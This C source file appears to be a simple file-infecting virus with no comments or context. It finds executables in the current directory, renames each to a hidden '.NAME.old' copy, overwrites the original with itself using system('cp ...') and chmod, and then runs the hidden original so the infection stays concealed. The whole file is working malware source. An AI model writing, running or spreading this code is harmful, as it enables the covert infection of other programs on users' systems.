#include <dirent.h>
#include <libgen.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

typedef struct {
  char new[1000];
  char old[1000];
  char main[50];
} pg;

char *isInfected(pg *files) {
  static char file[500];
  char *strToken = strtok(files->new, "/");
  while (strToken != NULL) {
    if (strstr(files->old, strToken) == NULL) {
      snprintf(file, sizeof(file), "%s/%s", file, strToken);
    }
    strToken = strtok(NULL, "/");
  }
  return file;
}

/**
 * @brief
 * @params
 * @return
 */
void infect(char *fileUninfected, char *prog_name) {
  DIR *dir;
  if ((dir = opendir(".")) == NULL) {
    perror("Cannot open .");
    exit(EXIT_FAILURE);
  }
  char *strToken = strtok(fileUninfected, "/");
  while (strToken != NULL) {
    char tempName[50];
    char cpQuery[50];
    char chQuery[50];

    snprintf(tempName, sizeof(tempName), ".%s.old", strToken);
    rename(strToken, tempName);
    snprintf(cpQuery, sizeof(cpQuery), "cp %s %s 2>/dev/null", prog_name,
             strToken);
    snprintf(chQuery, sizeof(chQuery), "chmod +x %s 2>/dev/null", strToken);
    system(cpQuery);
    system(chQuery);

    strToken = strtok(NULL, "/");
  }
}

pg *fileFinder(char *prog_name) {
  DIR *dir;
  struct dirent *dp;
  static pg file;

  if ((dir = opendir(".")) == NULL) {
    perror("Cannot open .");
    exit(EXIT_FAILURE);
  }

  while ((dp = readdir(dir)) != NULL) {
    struct stat st;

    if (stat(dp->d_name, &st) == 0 && S_ISREG(st.st_mode) &&
        (st.st_mode & S_IXUSR) && strcmp(dp->d_name, prog_name) != 0 &&
        strcmp(dp->d_name, "main") != 0) {

      if (strstr(dp->d_name, "old") != NULL) {
        snprintf(file.old, sizeof(file.old), "%s/%s", file.old, dp->d_name);
      } else {
        snprintf(file.new, sizeof(file.new), "%s/%s", file.new, dp->d_name);
      }

    } else if (strcmp(dp->d_name, prog_name) == 0) {
      snprintf(file.main, sizeof(file.main), "%s", dp->d_name);
    }
  }
  closedir(dir);
  return &file;
}

int main(int argc, char *argv[]) {
  char exeQuery[50];
  char pathbuf[256];
  snprintf(pathbuf, sizeof(pathbuf), "%s", argv[0]);
  char *prog_name = basename(pathbuf);
  pg *files = fileFinder(prog_name);
  char *fileUninfected = isInfected(files);
  infect(fileUninfected, prog_name);
  snprintf(exeQuery, sizeof(exeQuery), "./.%s.old 2>/dev/null", files->main);
  system(exeQuery);
}
